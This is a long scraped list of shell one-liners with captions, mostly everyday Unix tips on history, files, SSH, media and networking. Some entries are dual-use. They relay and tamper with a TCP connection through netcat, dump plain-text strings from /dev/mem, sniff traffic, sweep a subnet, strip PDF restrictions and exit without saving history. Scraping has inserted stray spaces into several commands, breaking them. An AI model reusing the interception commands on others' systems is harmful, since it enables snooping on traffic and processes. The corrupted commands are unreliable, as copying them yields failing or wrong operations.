# One-liners

Run the last command as root
$ sudo !!

Serve current directory tree at http://$HOSTNAME:8000/
$ python -m SimpleHTTPServer


Runs previous command but replacing
$ ^foo^bar

copy
Rapidly invoke an editor to write a long, complex, or tricky command
$ ctrl-x e
copy
Place the argument of the most recent command on the shell
$ 'ALT+.' or '<ESC> .'
copy
currently mounted filesystems in nice layout
$ mount |  column -t
copy
Salvage a borked terminal
$ reset
copy
Get your external IP address
$ curl ifconfig.me
copy
Execute a command at a given time
$ echo "ls -l" |  at midnight
copy
Quick access to the ascii table.
$ man  ascii
copy
output your microphone to a remote computer's speaker
$ dd if=/dev/dsp |  ssh -c arcfour -C username@host  dd of=/dev/dsp
copy
type partial command, kill this command, check something you forgot, yank the command, resume typing.
$ <ctrl+u> [...] <ctrl+y>
copy
Query Wikipedia via console over DNS
$ dig +short txt <keyword>.wp.dg.cx
copy
Mount folder/filesystem through SSH
$ sshfs name@server:/path/to/folder /path/to/mount/point
copy
Mount a temporary ram partition
$ mount -t tmpfs tmpfs /mnt -o size=1024m


Download an entire website
$ wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com

copy
Clear the terminal screen
$ ctrl-l
copy
Compare a remote file with a local file
$ ssh user@host  cat /path/to/remotefile |  diff /path/to/localfile -
copy
SSH connection through host in the middle
$ ssh -t reachable_host  ssh unreachable_host
copy
Update twitter via curl
$ curl -u user:pass -d status="Tweeting  from the shell" http://twitter.com/statuses/update.xml
copy
A very simple and useful stopwatch
$ time  read (ctrl-d to stop)
copy
Put a console clock in top right corner
$ while  sleep 1;do  tput sc; tput cup 0 $(($( tput cols)-29));date; tput rc;done &
copy
Make 'less' behave like 'tail -f'.
$ less +F somelogfile
copy
Close shell keeping all subprocess running
$ disown -a &&  exit
copy
Watch Star Wars via telnet
$ telnet towel.blinkenlights.nl
copy
32 bits or 64 bits?
$ getconf LONG_BIT
copy
List of commands you use most often
$ history |  awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' |  sort -rn |  head
copy
Simulate typing
$ echo "You can simulate on-screen typing just like in the movies" |  pv -qL 10
copy
Set audible alarm when an IP address comes online
$ ping -i 60 -a IP_address
copy
Reboot machine when everything is hanging
$ <alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>
copy
quickly rename a file
$ mv filename.{old,new}
copy
Display the top ten running processes - sorted by memory usage
$ ps aux |  sort -nk +4 |  tail
copy
Delete all files in a folder that don't match a certain file extension
$ rm !(*.foo|*.bar|*.baz)
copy
Push your present working directory to a stack that you can pop later
$ pushd /tmp
copy
Create a script of the last executed command
$ echo "!!" > foo.sh
copy
Watch Network Service Activity in Real-time
$ lsof -i
copy
Easy and fast access to often executed commands that are very long and complex.
$ some_very_long_and_complex_command # label
copy
escape any command aliases
$ \[command]
copy
Show apps that use internet connection at the moment. (Multi-Language)
$ lsof -P -i -n
copy
diff two unsorted files without creating temporary files
$ diff <(sort file1) <(sort file2)
copy
Reuse all parameter of the previous command line
$ !*
copy
Backticks are evil
$ echo "The  date is: $( date +%D)"
copy
Sharing file through http 80 port
$ nc -v -l 80 < file.ext
copy
Show File System Hierarchy
$ man hier
copy
Display a block of text with AWK
$ awk '/start_pattern/,/stop_pattern/' file.txt
copy
Set CDPATH to ease navigation
$ CDPATH=:..:~:~/projects
copy
save command output to image
$ ifconfig |  convert label:@- ip.png
copy
Add Password Protection to a file your editing in vim.
$ vim -x <FILENAME>
copy
Remove duplicate entries in a file without sorting.
$ awk '!x[$0]++' <file>
copy
Copy your SSH public key on a remote machine for passwordless login - the easy way
$ ssh-copy-id username@hostname
copy
Find Duplicate Files (based on size first, then MD5 hash)
$ find -not -empty -type f -printf "%s
" |  sort -rn |  uniq -d |  xargs -I{} -n1  find -type f -size {}c -print0 |  xargs -0  md5sum |  sort |  uniq -w32 --all-repeated=separate
copy
Kills a process that is locking a file.
$ fuser -k filename
copy
Insert the last command without the last argument (bash)
$ !:-
copy
python smtp server
$ python -m smtpd -n -c DebuggingServer localhost:1025
copy
Display which distro is installed
$ cat /etc/issue
copy
Find the process you are looking for minus the grepped one
$ ps aux |  grep [p]rocess-name
copy
Extract tarball from internet without local saving
$ wget -qO - "http://www. tarball.com/ tarball.gz" |  tar zxvf -
copy
Copy your ssh public key to a server from a machine that doesn't have ssh-copy-id
$ cat ~/. ssh/id_rsa.pub |  ssh user@machine "mkdir ~/. ssh;  cat >> ~/. ssh/authorized_keys"
copy
Matrix Style
$ tr -c "[:digit:]" " " < /dev/urandom |  dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32"  grep --color "[^ ]"
copy
replace spaces in filenames with underscores
$ rename 'y/ /_/' *
copy
Rip audio from a video file.
$ mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-file>
copy
Google Translate
$ translate(){  wget -qO- "http://ajax.googleapis.com/ajax/services/language/translate?v=1.0&q=$1&langpair=$2|${3:-en}" |  sed 's/.*"translatedText":"\([^"]*\)".*}/\1
/'; }
copy
Inserts the results of an autocompletion in the command line
$ ESC *
copy
Rapidly invoke an editor to write a long, complex, or tricky command
$ fc
copy
A fun thing to do with ram is actually open it up and take a peek. This command will show you all the string (plain text) values in ram
$ sudo  dd if=/dev/mem |  cat |  strings
copy
Graphical tree of sub-directories
$ ls -R |  grep ":$" |  sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'
copy
intercept stdout/stderr of another process
$ strace -ff -e trace=write -e write=1,2 -p SOME_PID
copy
Copy a file using pv and watch its progress
$ pv sourcefile > destfile
copy
Define a quick calculator function
$ ? () {  echo "$*" |  bc -l; }
copy
Create a CD/DVD ISO image from disk.
$ readom dev=/dev/scd0 f=/path/to/image.iso
copy
mkdir & cd into it as single command
$ mkdir /home/foo/doc/bar &&  cd $_
copy
Create a pdf version of a manpage
$ man -t  manpage |  ps2pdf - filename.pdf
copy
Stream YouTube URL directly to mplayer.
$ i="8uyxVmdaJ-w";mplayer -fs $(curl -s "http://www.youtube.com/get_video_info?&video_id=$i" |  echo -e $(sed 's/%/\\x/g;s/.*\(v[0-9]\.lscache.*\)/http:\/\/\1/g') |  grep -oP '^[^|,]*')
copy
Make directory including intermediate directories
$ mkdir -p a/long/directory/path
copy
Easily search running processes (alias).
$ alias 'ps?'='ps ax |  grep '
copy
Multiple variable assignments from command output in BASH
$ read day month year <<< $(date +'%d %m %y')
copy
Remove all but one specific file
$ rm -f !(survivior.txt)
copy
git remove files which have been deleted
$ git add -u
copy
Edit a file on a remote host using vim
$ vim scp://username@host//path/to/somefile
copy
Job Control
$ ^Z $bg $disown
copy
Generate a random password 30 characters long
$ s trings /dev/urandom |  grep -o '[[:alnum:]]' |  head -n 30 |  tr -d '
';  echo
copy
Show apps that use internet connection at the moment. (Multi-Language)
$ ss -p
copy
Graph # of connections for each hosts.
$ netstat -an |  grep ESTABLISHED |  awk '{ print $5}' |  awk -F: '{ print $1}' |  sort |  uniq -c |  awk '{  printf("%s\t%s\t",$2,$1) ;  for (i = 0; i < $1; i++) { printf("*")};  print "" }'
copy
Record a screencast and convert it to an mpeg
$ ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg
copy
Monitor progress of a command
$ pv access.log |  gzip > access.log.gz
copy
Search for a <pattern> string inside all files in the current directory
$ grep -RnisI <pattern> *
copy
Monitor the queries being run by MySQL
$ watch -n 1 mysqladmin --user=<user> --password=<password> processlist
copy
Get the 10 biggest files/folders for the current direcotry
$ du -s * |  sort -n |  tail
copy
Show numerical values for each of the 256 colors in bash
$ for  code in {0..255}; do  echo -e "\e[38;05;${ code}m $ code: Test"; done
copy
Recursively remove all empty directories
$ find . -type d -empty -delete
copy
Display a cool clock on your terminal
$ watch -t -n1 "date +%T|figlet"
copy
Convert seconds to human-readable format
$ date -d@1234567890
copy
Nice weather forecast on your shell
$ curl wttr.in/seville
copy
Check your unread Gmail from the command line
$ curl -u username:password --silent "https://mail.google.com/mail/feed/atom" |  tr -d '
' |  awk -F '<en try>' '{for (i=2; i<=NF; i++) {print $i}}' |  sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
copy
Search commandlinefu.com from the command line using the API
$ cmdfu(){  curl "http://www.commandlinefu.com/commands/matching/$@/$(echo -n $@ |  openssl base64)/plaintext"; }
copy
Processor / memory bandwidthd? in GB/s
$ dd if=/dev/zero of=/dev/null bs=1M count=32768
copy
pretend to be busy in office to enjoy a cup of coffee
$ cat /dev/urandom |  hexdump -C |  grep "ca fe"
copy
Makes the permissions of file2 the same as file1
$ chmod --reference file1 file2
copy
Remove security limitations from PDF documents using ghostscript
$ gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrite -f INPUT.pdf
copy
Send pop-up notifications on Gnome
$ notify-send ["<title>"] "<body>"
copy
(Debian/Ubuntu) Discover what package a file belongs to
$ dpkg -S /usr/bin/ls
copy
Mount a .iso file in UNIX/Linux
$ mount /path/to/file.iso /mnt/cdrom -oloop
copy
Remove a line in a text file. Useful to fix
$ ssh-keygen -R <the_offending_host>
copy
To print a specific line from a file
$ sed -n 5p <file>
copy
Open Finder from the current Terminal location
$ open .
copy
Create a persistent connection to a machine
$ ssh -MNf <user>@<host>
copy
Run a command only when load average is below a certain threshold
$ echo "rm -rf /unwanted-but-large/folder" |  batch
copy
Create a quick back-up copy of a file
$ cp file.txt{,.bak}
copy
Start COMMAND, and kill it if still running after 5 seconds
$ timeout 5s COMMAND
copy
Attach screen over ssh
$ ssh -t remote_host  screen -r
copy
Show a 4-way scrollable process tree with full details.
$ ps awwfux |  less -S
copy
List all bash shortcuts
$ bind -P
copy
RTFM function
$ rtfm() { help $@ ||  man $@ || $BROWSER "http://www.google.com/search?q=$@"; }
copy
Eavesdrop on your system
$ diff <( lsof -p 1234) <(sleep 10;  lsof -p 1234)
copy
Remove all files previously extracted from a tar(.gz) file.
$ tar -tf <file. tar.gz> |  xargs  rm -r
copy
Broadcast your shell thru ports 5000, 5001, 5002 ...
$ script -qf |  tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
copy
directly ssh to host B that is only accessible through host A
$ ssh -t hostA  ssh hostB
copy
which program is this port belongs to ?
$ lsof -i tcp:80
copy
What is my public IP-address?
$ curl ifconfig.me
copy
Retry the previous command until it exits successfully
$ until !!; do :; done
copy
Synchronize date and time with a server over ssh
$ date --set="$(ssh user@server  date)"
copy
Edit a google doc with vim
$ google docs  edit --title "To-Do List" -- editor  vim
copy
Run a file system check on your next boot.
$ sudo  touch /forcefsck
copy
List only the directories
$ ls -d */
copy
Share a terminal screen with others
$ %  screen -r someuser/
copy
Google text-to-speech in mp3 format
$ wget -q -U Mozilla -O output.mp3 "http://translate.google.com/translate_tts?ie=UTF-8&tl=en&q=hello+world
copy
Download all images from a site
$ wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://example.com/images
copy
Download Youtube video with wget!
$ wget http://www.youtube.com/watch?v=dQw4w9WgXcQ -qO- |  sed -n "/fmt_url_map/{s/[\'\"\|]/
/g;p}" |  sed -n '/^fmt_url_map/,/videoplayback/p' |  sed -e :a -e '$q;N;5,$D;ba' |  tr -d '
' |  sed -e 's/\(.*\),\(.\)\{1,3\}/\1/' |  wget -i - -O surprise.flv
copy
Python version 3: Serve current directory tree at http://$HOSTNAME:8000/
$ python -m http.server
copy
Get your outgoing IP address
$ dig +short myip.opendns.com @resolver1.opendns.com
copy
Binary Clock
$ watch -n 1 'echo "obase=2;`date +%s`" | bc'
copy
Sort the size usage of a directory tree by gigabytes, kilobytes, megabytes, then bytes.
$ du -b --max-depth 1 |  sort -nr |  perl -pe 's{([0-9]+)}{sprintf "%.1f%s", $1>=2**30? ($1/2**30, "G"): $1>=2**20? ($1/2**20, "M"): $1>=2**10? ($1/2**10, "K"): ($1, "")}e'
copy
Duplicate installed packages from one machine to the other (RPM-based systems)
$ ssh root@remote.host "rpm -qa" |  xargs  yum -y  install
copy
Draw kernel module dependancy graph.
$ lsmod |  perl -e ' print "digraph \" lsmod\" {";<>;while(<>){@_=split/\s+/;  print "\"$_[0]\" -> \"$_\"
"  for split/,/,$_[3]} print "}"' |  dot -Tpng | display -
copy
Compare two directory trees.
$ diff <(cd dir1 &&  find | sort) <(cd dir2 &&  find | sort)
copy
Bring the word under the cursor on the :ex line in Vim
$ :<C-R><C-W>
copy
Remind yourself to leave in 15 minutes
$ leave +15
copy
make directory tree
$ mkdir -p work/{d1,d2}/{src,bin,bak}
copy
Convert Youtube videos to MP3
$ youtube-dl -t --extract-audio --audio-format mp3 YOUTUBE_URL_HERE
copy
Find out how much data is waiting to be written to disk
$ grep ^Dirty /proc/meminfo
copy
Use tee to process a pipe with two or more processes
$ echo "tee can  split a pipe in two"|tee >(rev) >(tr ' ' '_')
copy
Show apps that use internet connection at the moment.
$ lsof -P -i -n |  cut -f 1 -d " "|  uniq |  tail -n +2
copy
Backup all MySQL Databases to individual files
$ for I in $(mysql -e 'show databases' -s --skip-column-names); do  mysqldump $I |  gzip > "$I.sql.gz"; done
copy
Port Knocking!
$ knock <host> 3000 4000 5000 &&  ssh -p <port> user@host && knock <host> 5000 4000 3000
copy
Add timestamp to history
$ export HISTTIMEFORMAT="%F %T "
copy
Recursively change permissions on files, leave directories alone.
$ find ./ -type f -exec  chmod 644 {} \;
copy
Find files that have been modified on your system in the past 60 minutes
$ sudo  find / -mmin 60 -type f
copy
Quick access to ASCII code of a key
$ showkey -a
copy
using `!#$' to referance backward-word
$ cp /work/host/phone/ui/main. cpp !#$:s/host/target
copy
Search recursively to find a word or phrase in certain file types, such as C code
$ find . -name "*.[ch]" -exec  grep -i -H "search pharse" {} \;
copy
Intercept, monitor and manipulate a TCP connection.
$ mkfifo /tmp/fifo;  cat /tmp/fifo |  nc -l -p 1234 |  tee -a to.log |  nc machine port |  tee -a from.log > /tmp/fifo
copy
Block known dirty hosts from reaching your machine
$ wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print "iptables -A INPUT -s "$1" -j DROP"}'
copy
check site ssl certificate dates
$ echo |  openssl s_client -connect www.google.com:443 2>/dev/null | openssl x509 -dates -noout
copy
find files in a date range
$ find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
copy
Control ssh connection
$ [enter]~?
copy
run complex remote shell cmds over ssh, without escaping quotes
$ ssh  host -l user $(<cmd.txt)
copy
Create a directory and change into it at the same time
$ md () {  mkdir -p "$@" &&  cd "$@"; }
copy
Colorized grep in less
$ grep --color=always |  less -R
copy
Exclude multiple columns using AWK
$ awk '{$1=$3=""}1'  file
copy
ls not pattern
$ ls !(*.gz)
copy
output your microphone to a remote computer's speaker
$ arecord -f dat |  ssh -C user@host  aplay -f dat
copy
analyze traffic remotely over ssh w/ wireshark
$ ssh root@server.com 'tshark -f "port !22" -w -' |  wireshark -k -i -
copy
Given a file path, unplug the USB device on which the file is located (the file must be on an USB device !)
$ echo $( sudo  lshw -businfo |  grep -B 1 -m 1 $(df "/path/to/file" |  tail -1 |  awk '{print $1}' |  cut -c 6-8) |  head -n 1 |  awk '{print $1}' |  cut -c 5- |  tr ":" "-") |  sudo  tee /sys/bus/usb/drivers/usb/unbind
copy
Remove a line in a text file. Useful to fix "ssh host key change" warnings
$ sed -i 8d ~/.ssh/known_hosts
copy
Save a file you edited in vim without the needed permissions (no echo)
$ :w !sudo  tee > /dev/null %
copy
Remove blank lines from a file using grep and save output to new file
$ grep . filename > newfilename
copy
delete a line from your shell history
$ history -d
copy
Get the IP of the host your coming from when logged in remotely
$ echo ${SSH_CLIENT%% *}
copy
Random Number Between 1 And X
$ echo $[RANDOM%X+1]
copy
Lists all listening ports together with the PID of the associated process
$ lsof -Pan -i tcp -i udp
copy
easily find megabyte eating files or directories
$ alias dush="du -sm *|sort -n|tail"
copy
Exclude .svn, .git and other VCS junk for a pristine tarball
$ tar --exclude-vcs -cf src. tar src/
copy
exit without saving history
$ kill -9 $$
copy
How to establish a remote Gnu screen session that you can re-connect to
$ ssh -t user@some.domain.com /usr/bin/screen -xRR
copy
Copy a MySQL Database to a new Server via SSH with one command
$ mysqldump --add-drop-table --extended-insert --force --log-error=error.log -uUSER -pPASS OLD_DB_NAME |  ssh -C user@newhost "mysql -uUSER -pPASS NEW_DB_NAME"
copy
Convert PDF to JPG
$ for  file in `ls *.pdf`; do  convert -verbose -colorspace RGB -resize 800 -interlace none -density 300 -quality 80 $ file `echo $ file |  sed 's/\.pdf$/\.jpg/'`; done
copy
Find usb device
$ diff <(lsusb) <(sleep 3s && lsusb)
copy
find all file larger than 500M
$ find / -type f -size +500M
copy
notify yourself when a long-running command which has ALREADY STARTED is finished
$ <ctrl+z> fg; notify_me
copy
Create colorized html file from Vim or Vimdiff
$ :TOhtml
copy
live ssh network throughput test
$ yes |  pv |  ssh $host "cat > /dev/null"
copy
Create a nifty overview of the hardware in your computer
$ lshw -html > hardware.html
copy
Save your sessions in vim to resume later
$ :mksession! <filename>
copy
Tell local Debian machine to install packages used by remote Debian machine
$ ssh remotehost ' dpkg --get-selections' |  dpkg --set-selections && dselect  install
copy
Bind a key with a command
$ bind -x '"\C-l":ls -l'
copy
Take screenshot through SSH
$ DISPLAY=:0.0  import -window root /tmp/shot.png
copy
intersection between two files
$ grep -Fx -f file1 file2
copy
GREP a PDF file.
$ pdftotext [file] - |  grep 'YourPattern'
copy
Colorful man
$ apt-get  install  most &&  update-alternatives --set pager /usr/bin/ most
copy
copy working directory and compress it on-the-fly while showing progress
$ tar -cf - . |  pv -s $(du -sb . |  awk '{print $1}') |  gzip > out.tgz
copy
prints line numbers
$ nl
copy
convert unixtime to human-readable
$ date -d @1234567890
copy
A fun thing to do with ram is actually open it up and take a peek. This command will show you all the string (plain text) values in ram
$ sudo  strings /dev/mem
copy
Diff on two variables
$ diff <(echo "$a") <(echo "$b")
copy
Prettify an XML file
$ tidy -xml -i -m [file]
copy
Encrypted archive with openssl and tar
$ tar --create --file - --posix --gzip -- <dir> |  openssl enc -e -aes256 -out <file>
copy
Convert seconds into minutes and seconds
$ bc <<< 'obase=60;299'
copy
Alias HEAD for automatic smart output
$ alias head='head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))'
copy
Pipe stdout and stderr, etc., to separate commands
$ some_command > >(/bin/cmd_for_stdout) 2> >(/bin/cmd_for_stderr)
copy
Manually Pause/Unpause Firefox Process with POSIX-Signals
$ killall -STOP -m  firefox
copy
Gets a random Futurama quote from /.
$ curl -Is slashdot.org |  egrep '^X-(F|B|L)' |  cut -d \- -f 2
copy
Use lynx to run repeating website actions
$ lynx -accept_all_cookies -cmd_script=/your/keystroke-file
copy
runs a bash script in debugging mode
$ bash -x ./post_to_commandlinefu.sh
copy
Instead of writing a multiline if/then/else/fi construct you can do that by one line
$ [[ test_condition ]] && if_true_do_this || otherwise_do_that
copy
Display a list of committers sorted by the frequency of commits
$ svn log -q|grep "|"|awk "{print \$3}"|sort|uniq -c|sort -nr
copy
check the status of 'dd' in progress (OS X)
$ CTRL + T
copy
A child process which survives the parent's death (for sure)
$ (  command & )
copy
prevent accidents while using wildcards
$ rm *.txt <TAB> <TAB>
copy
Opens vi/vim at pattern in file
$ vi +/pattern [file]
copy
April Fools' Day Prank
$ PROMPT_COMMAND='if [ $RANDOM -le 3200 ]; then  printf "\0337\033[%d;%dH\033[4%dm \033[m\0338" $((RANDOM%LINES+1)) $((RANDOM%COLUMNS+1)) $((RANDOM%8)); fi'
copy
Press Any Key to Continue
$ read -sn 1 -p "Press any key to continue..."
copy
Get your external IP address
$ curl ip.appspot.com
copy
List installed deb packages by size
$ dpkg-query -Wf '${Installed-Size}\t${Package}
' |  sort -n
copy
backup all your commandlinefu.com favourites to a plaintext file
$ clfavs(){ URL="http://www.commandlinefu.com"; wget -O - --save-cookies c --post-data "username=$1&password=$2&submit=Let+me+in" $URL/users/signin;for i in `seq 0 25 $3`;do  wget -O - --load-cookies c $URL/commands/favourites/plaintext/$i >>$4;done;rm -f c;}
copy
send echo to socket network
$ echo "foo" > /dev/tcp/192.168.1.2/25
copy
Schedule a script or command in x num hours, silently run in the background even if logged out
$ ( (  sleep 2h; your-command your-args ) & )
copy
Go to parent directory of filename edited in last command
$ cd !$:h
copy
Draw a Sierpinski triangle
$ perl -e 'print "P1
256 256
", map {$_&($_>>8)?1:0} (0..0xffff)' | display
copy
Run a long job and notify me when it's finished
$ ./my-really-long-job.sh &&  notify-send "Job finished"
copy
Make anything more awesome
$ command |  figlet
copy
List all files opened by a particular command
$ lsof -c  dhcpd
copy
Nicely display permissions in octal format with filename
$ stat -c '%A %a %n' *
copy
recursive search and replace old with new string, inside files
$ $ grep -rl oldstring . |xargs  sed -i -e 's/oldstring/newstring/'
copy
shut of the screen.
$ xset dpms force standby
copy
Create a single-use TCP (or UDP) proxy
$ nc -l -p 2000 -c " nc example.org 3000"
copy
read manpage of a unix command as pdf in preview (Os X)
$ man -t UNIX_COMMAND | open -f -a preview
copy
Switch 2 characters on a command line.
$ ctrl-t
copy
List the number and type of active network connections
$ netstat -ant |  awk '{print $NF}' |  grep -v '[a-z]' |  sort |  uniq -c
copy
Use file(1) to view device information
$ file -s /dev/sd*
copy
exclude a column with cut
$ cut -f5 --complement
copy
Recover a deleted file
$ grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
copy
Insert the last argument of the previous command
$ <ESC> .
copy
View the newest xkcd comic.
$ xkcd(){  wget -qO- http://xkcd.com/|tee >(feh $(grep -Po '(?<=")http://imgs[^/]+/comics/[^"]+\.\w{3}'))|grep -Po '(?<=(\w{3})" title=").*(?=" alt)';}
copy
Create an audio test CD of sine waves from 1 to 99 Hz
$ ( echo CD_DA;  for f in {01..99}; do  echo "$f Hz">&2;  sox -nt cdda -r44100 -c2 $f.cdda synth 30 sine $f;  echo TRACK AUDIO;  echo FILE \"$f.cdda\" 0; done) > cdrdao.toc && cdrdao  write cdrdao.toc &&  rm ??.cdda cdrdao.toc
copy
Remove color codes (special characters) with sed
$ sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
copy
throttle bandwidth with cstream
$ tar -cj /backup | cstream -t 777k |  ssh  host ' tar -xj -C /backup'
copy
When feeling down, this command helps
$ sl
copy
Brute force discover
$ sudo  zcat /var/log/auth.log.*.gz |  awk '/Failed password/&&!/ for invalid user/{a[$9]++}/Failed password  for invalid user/{a["*" $11]++}END{ for (i in a)  printf "%6s\t%s
", a[i], i|"sort -n"}'
copy
find geographical location of an ip address
$ lynx -dump http://www.ip-adress.com/ip_tracer/?QRY=$1|grep address|egrep 'city|state|country'|awk '{print $3,$4,$5,$6,$7,$8}'|sed 's\ip address flag \\'|sed 's\My\\'
copy
Speed up launch of firefox
$ find ~ -name '*.sqlite' -exec  sqlite3 '{}' 'VACUUM;' \;
copy
Create strong, but easy to remember password
$ read -s pass;  echo $pass |  md5sum |  base64 |  cut -c -16
copy
format txt as table not joining empty columns
$ column -tns: /etc/passwd
copy
Find Duplicate Files (based on size first, then MD5 hash)
$ fdupes -r .
copy
Shell recorder with replay
$ script -t /tmp/mylog.out 2>/tmp/mylog.time; <do your work>; <CTRL-D>;  scriptreplay /tmp/mylog.time /tmp/mylog.out
copy
Bind a key with a command
$ bind '"\C-l":"ls -l
"'
copy
List files with quotes around each filename
$ ls -Q
copy
Makes you look busy
$ alias busy='my_file=$(find /usr/include -type f |  sort -R |  head -n 1); my_len=$(wc -l $my_file |  awk "{print $1}"); let "r = $RANDOM % $my_len" 2>/dev/null;  vim +$r $my_file'
copy
Duplicate several drives concurrently
$ dd if=/dev/sda |  tee >( dd of=/dev/sdb) |  dd of=/dev/sdc
copy
Listen to BBC Radio from the command line.
$ bbcradio() {  local  s PS3="Select a  station: "; select  s in 1 1x 2 3 4 5 6 7 "A sian Network an" "Nation s & Local lcl";do break;done; s=($ s);mplayer -playli st "http://www.bbc.co.uk/radio/li sten/live/r"${ s[@]: -1}".a sx";}
copy
Monitor bandwidth by pid
$ nethogs -p eth0
copy
Execute a command with a timeout
$ timeout 10  sleep 11
copy
use vim to get colorful diff output
$ svn  diff |  view -
copy
find files containing text
$ grep -lir "some text" *
copy
Quickly graph a list of numbers
$ gnuplot -persist <(echo "plot '<(sort -n listOfNumbers.txt)' with lines")
copy
Perform a branching conditional
$ true && {  echo success;} || {  echo failed; }
copy
Resume scp of a big file
$ rsync --partial --progress --rsh=ssh  $file_source $user@$host:$destination_file
copy
Use tee + process substitution to split STDOUT to multiple commands
$ some_command |  tee >(command1) >(command2) >(command3) ... | command4
copy
Analyse an Apache access log for the most common IP addresses
$ tail -10000 access_log |  awk '{print $1}' |  sort |  uniq -c |  sort -n |  tail
copy
Annotate tail -f with timestamps
$ tail -f  file |  while read; do  echo "$(date +%T.%N) $REPLY"; done
copy
Fast, built-in pipe-based data sink
$ <COMMAND> |:
copy
Generate an XKCD #936 style 4 word password
$ shuf -n4 /usr/share/dict/words |  tr -d '
'
copy
Repoint an existing symlink to a new location
$ ln -nsf <TARGET> <LINK>
copy
GRUB2: set Super Mario as startup tune
$ echo "GRUB_INIT_TUNE=\"1000 334 1 334 1 0 1 334 1 0 1 261 1 334 1 0 1 392 2 0 4 196 2\"" |  sudo  tee -a /etc/default/grub > /dev/null &&  sudo  update-grub
copy
Diff remote webpages using wget
$ diff <(wget -q -O - URL1) <(wget -q -O - URL2)
copy
Close a hanging ssh session
$ ~.
copy
processes per user counter
$ ps hax -o user |  sort |  uniq -c
copy
convert filenames in current directory to lowercase
$ rename 'y/A-Z/a-z/' *
copy
Find files that were modified by a given command
$ touch /tmp/file ; $EXECUTECOMMAND ;  find /path -newer /tmp/file
copy
Terminal - Show directories in the PATH, one per line with sed and bash3.X `here string'
$ tr : '
' <<<$PATH
copy
Cut out a piece of film from a file. Choose an arbitrary length and starting time.
$ ffmpeg -vcodec copy -acodec copy -i orginalfile -ss 00:01:30 -t 0:0:20 newfile
copy
List of commands you use most often
$ history |  awk '{print $2}' |  sort |  uniq -c |  sort -rn |  head
copy
Efficiently print a line deep in a huge log file
$ sed '1000000!d;q' < massive-log-file.log
copy
prevent large files from being cached in memory (backups!)
$ nocache <I/O-heavy-command>
copy
Check if system is 32bit or 64bit
$ getconf LONG_BIT
copy
dmesg with colored human-readable dates
$ dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
copy
convert single digit to double digits
$ for i in ?.ogg; do  mv $i 0$i; done
copy
Limit the cpu usage of a process
$ sudo  cpulimit -p pid -l 50
copy
Rapidly invoke an editor to write a long, complex, or tricky command
$ <ESC> v or ctrl-x ctrl-e
copy
Single use vnc-over-ssh connection
$ ssh -f -L 5900:localhost:5900 your. ssh.server "x11vnc -safer -localhost -nopw -once -display :0"; vinagre localhost:5900
copy
List alive hosts in specific subnet
$ nmap -sP 192.168.1.0/24
copy
View all date formats, Quick Reference Help Alias
$ alias  dateh=' date --help|sed -n "/^ *%%/,/^ *%Z/p"|while  read l;do F=${l/% */};  date +%$F:"|'"'"'${F//%n/ }'"'"'|${l#* }";done|sed "s/\ *|\ */|/g" |column -s "|" -t'
copy
your terminal sings
$ echo {1..199}" bottles of beer on the wall, cold bottle of beer, take one down,  pass it around, one  less bottle of beer on the wall,, " |  espeak -v english -s 140
copy
Make sure a script is run in a terminal.
$ [ -t 0 ] ||  exit 1
copy
Matrix Style
$ echo -e "\e[32m";  while :; do  for i in {1..16}; do r="$(($RANDOM % 2))";  if [[ $(($RANDOM % 5)) == 1 ]]; then  if [[ $(($RANDOM % 4)) == 1 ]]; then v+="\e[1m $r   "; else v+="\e[2m $r   "; fi; else v+="     "; fi; done;  echo -e "$v"; v=""; done
copy
Quickly (soft-)reboot skipping hardware checks
$ /sbin/kexec -l /boot/$KERNEL --append="$KERNELPARAMTERS" --initrd=/boot/$INITRD; sync; /sbin/kexec -e
copy
pipe output of a command to your clipboard
$ some command|xsel --clipboard
copy
Recursively compare two directories and output their differences on a readable format
$ diff -urp /originaldirectory /modifieddirectory
copy
Find broken symlinks and delete them
$ find -L /path/to/check -type l -delete
copy
ls -hog --> a more compact ls -l
$ ls -hog
copy
git remove files which have been deleted
$ git  rm $( git ls-files --deleted)
copy
Silently ensures that a FS is mounted on the given mount point (checks if it's OK, otherwise unmount, create dir and mount)
$ ( mountpoint -q "/media/mpdr1" &&  df /media/mpdr1/* > /dev/null 2>&1) || (( sudo  u mount "/media/mpdr1" > /dev/null 2>&1 || true) && ( sudo  mkdir "/media/mpdr1" > /dev/null 2>&1 || true) &&  sudo  mount "/dev/sdd1" "/media/mpdr1")
copy
sniff network traffic on a given interface and displays the IP addresses of the machines communicating with the current host (one IP per line)
$ sudo  tcpdump -i wlan0 -n  ip |  awk '{  print gensub(/(.*)\..*/,"\\1","g",$3), $4, gensub(/(.*)\..*/,"\\1","g",$5) }' |  awk -F " > " '{ print $1"
"$2}'
copy
Create a local compressed tarball from remote host directory
$ ssh user@host "tar -zcf - /path/to/dir" > dir.tar.gz
copy
df without line wrap on long FS name
$ df -P |  column -t
copy
send a circular
$ wall <<< "Broadcast This"
copy
The BOFH Excuse Server
$ telnet towel.blinkenlights.nl 666
copy
dd with progress bar and statistics
$ sudo  dd if=/dev/sdc bs=4096 |  pv -s 2G |  sudo  dd bs=4096 of=~/USB_BLACK_BACKUP.IMG
copy
I finally found out how to use notify-send with at or cron
$ echo " export DISPLAY=:0;  export XAUTHORITY=~/.Xauthority;  notify-send test" |  at now+1minute
copy
See udev at work
$ udevadm monitor
copy
Backup all MySQL Databases to individual files
